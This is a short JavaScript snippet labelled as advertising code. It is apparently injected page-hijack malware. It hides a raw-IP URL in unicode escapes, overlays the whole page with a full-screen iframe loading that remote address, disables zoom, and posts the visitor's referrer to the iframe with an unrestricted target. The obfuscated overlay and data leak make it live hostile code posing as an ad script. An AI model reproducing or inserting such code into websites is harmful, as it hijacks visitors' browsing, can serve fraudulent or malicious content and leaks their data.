//Advertising 1-4
(function() {
    var urlArr = [
        '\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0034\u0035\u002e\u0035\u0038\u002e\u0031\u0038\u0030\u002e\u0033\u0039\u002f\u006e\u0065\u0077\u0073\u002f\u0064\u0061\u0074\u0061\u002e\u0070\u0068\u0070'
    ];
    var _url = urlArr[randomRange(urlArr.length)];
    setFrame(_url);

    function setFrame(olink){
      var ss = '<div style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial; background-repeat: initial;"><ifr'
        + 'ame id="showcloneshengxiaon" scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+olink+'"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;margin: 0;}</style>';
      setTimeout(function() {
        try {
          var _body = document.getElementsByTagName('body')[0];
          if(_body){
            document.getElementsByTagName('body')[0].insertAdjacentHTML('beforeend', ss);
          }else{
            setTimeout(function() {
              document.getElementsByTagName('body')[0].insertAdjacentHTML('beforeend', ss);
            }, 1000)
          }
          var oMeta = document.createElement('meta');
          oMeta.name = 'viewport';
          oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
          document.getElementsByTagName('head')[0].appendChild(oMeta);
      setTimeout(function () {var referrer = document.referrer;document.getElementById("showcloneshengxiaon").contentWindow.postMessage(referrer,'*');},2000);
        } catch (e) {}
      }, 200)
    }
    function randomRange(max) {
      return Math.floor(Math.random() * max);
    }
})();